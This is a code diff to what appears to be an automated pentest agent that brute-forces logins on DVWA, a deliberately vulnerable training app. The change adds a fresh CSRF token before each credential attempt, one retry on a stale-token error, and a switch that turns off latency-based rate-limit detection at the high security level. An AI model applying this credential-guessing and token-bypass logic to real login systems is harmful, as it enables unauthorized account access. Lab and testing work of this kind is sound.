@@ -43,6 +43,7 @@ _SUCCESS_SIGNALS = [
     "welcome to the password protected area",
     "password protected area",
 ]
+_CSRF_TOKEN_ERROR_MARKER = "csrf token is incorrect"
 
 
 def _module_user_token(session: DVWASession) -> str | None:
@@ -62,6 +63,43 @@ def _credential_params(username: str, password: str, user_token: str | None) -> 
     if user_token:
         params["user_token"] = user_token
     return params
+
+
+def _response_indicates_csrf_token_error(response: Any) -> bool:
+    """Return whether DVWA rejected the submitted form token."""
+    body = getattr(response, "text", "")
+    return isinstance(body, str) and _CSRF_TOKEN_ERROR_MARKER in body.lower()
+
+
+def _credential_requests(
+    session: DVWASession,
+    username: str,
+    password: str,
+    security_level: str,
+    user_token: str | None,
+) -> list[Any]:
+    """Send one credential request, retrying a stale high-level token once.
+
+    The retry is deliberately bounded. High security rotates ``user_token``
+    between form requests, so each request (including the retry) gets a token
+    fetched immediately beforehand. Lower security levels retain the existing
+    caller-supplied token behavior.
+    """
+    high_security = str(security_level).strip().lower() == "high"
+    responses: list[Any] = []
+    max_attempts = 2 if high_security else 1
+
+    for attempt in range(max_attempts):
+        request_token = _module_user_token(session) if high_security else user_token
+        response = session.get(
+            MODULE_PATH,
+            params=_credential_params(username, password, request_token),
+        )
+        responses.append(response)
+        if not (high_security and attempt == 0 and _response_indicates_csrf_token_error(response)):
+            break
+
+    return responses
 
 
 def _response_indicates_rate_limit(response: Any) -> bool:
@@ -131,6 +169,7 @@ def _probe_preconditions(
     *,
     cached_precondition: bool | None = None,
     user_token: str | None = None,
+    security_level: str = "low",
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send rapid requests to detect rate limiting.
 
@@ -156,21 +195,27 @@ def _probe_preconditions(
         username, password = _parse_credential(cred)
         request_started = time_mod.monotonic()
         try:
-            resp = session.get(
-                MODULE_PATH,
-                params=_credential_params(username, password, user_token),
+            responses = _credential_requests(
+                session,
+                username,
+                password,
+                security_level,
+                user_token,
             )
-            elapsed_seconds = _request_elapsed_seconds(resp, request_started)
-            response_elapsed.append(elapsed_seconds)
-            response_rate_limited = _response_indicates_rate_limit(resp)
-            rate_limit_detected = rate_limit_detected or response_rate_limited
-            events.append(probe_event(
-                AGENT_ID,
-                cred,
-                resp.status_code,
-                not response_rate_limited,
-                elapsed_ms=elapsed_seconds * 1000,
-            ))
+            for response_index, resp in enumerate(responses):
+                elapsed_seconds = _request_elapsed_seconds(resp, request_started)
+                response_rate_limited = _response_indicates_rate_limit(resp)
+                response_accepted = not _response_indicates_csrf_token_error(resp)
+                if response_index == len(responses) - 1:
+                    response_elapsed.append(elapsed_seconds)
+                    rate_limit_detected = rate_limit_detected or response_rate_limited
+                events.append(probe_event(
+                    AGENT_ID,
+                    cred,
+                    resp.status_code,
+                    not response_rate_limited and response_accepted,
+                    elapsed_ms=elapsed_seconds * 1000,
+                ))
         except Exception as exc:
             logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
             events.append(probe_event(AGENT_ID, cred, None, False))
@@ -181,7 +226,14 @@ def _probe_preconditions(
             return bool(cached_precondition), tried, observations, events
         return True, tried, {}, events  # Assume no rate limit if already probed
 
-    if rate_limit_detected or _latency_indicates_rate_limit(response_elapsed):
+    # DVWA high security intentionally sleeps for a random 0-3 seconds on
+    # each request.  Relative latency is therefore not a reliable throttle
+    # signal at high; keep explicit status/header/body markers authoritative.
+    latency_rate_limit = (
+        security_level != "high"
+        and _latency_indicates_rate_limit(response_elapsed)
+    )
+    if rate_limit_detected or latency_rate_limit:
         observations[_PROBE_OBSERVATION_KEY] = False
         return False, tried, observations, events
 
@@ -224,11 +276,21 @@ def _attempt_exploit(
             continue
 
         try:
-            resp = session.get(
-                MODULE_PATH,
-                params=_credential_params(username, password, user_token),
+            responses = _credential_requests(
+                session,
+                username,
+                password,
+                security_level,
+                user_token,
             )
-            events.append(exploit_event(AGENT_ID, payload, resp.status_code, True))
+            for resp in responses:
+                events.append(exploit_event(
+                    AGENT_ID,
+                    payload,
+                    resp.status_code,
+                    not _response_indicates_csrf_token_error(resp),
+                ))
+            resp = responses[-1]
 
             # Check for CAPTCHA (out of scope)
             if has_captcha_challenge(resp.text):
@@ -282,7 +344,7 @@ def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
                 failure_agents=[AGENT_ID],
             )
         session.set_security_level(security_level)
-        user_token = _module_user_token(session)
+        user_token = None if security_level == "high" else _module_user_token(session)
 
         already_tried = already_tried_payloads(state, AGENT_ID)
         confirmed_vulns: list[str] = []
@@ -302,6 +364,7 @@ def bf_dictionary_agent(state: ExploitationState) -> dict[str, Any]:
             already_tried,
             cached_precondition=cached_no_rate_limit,
             user_token=user_token,
+            security_level=security_level,
         )
         all_tried.extend(tried)
         telemetry_events.extend(probe_events)
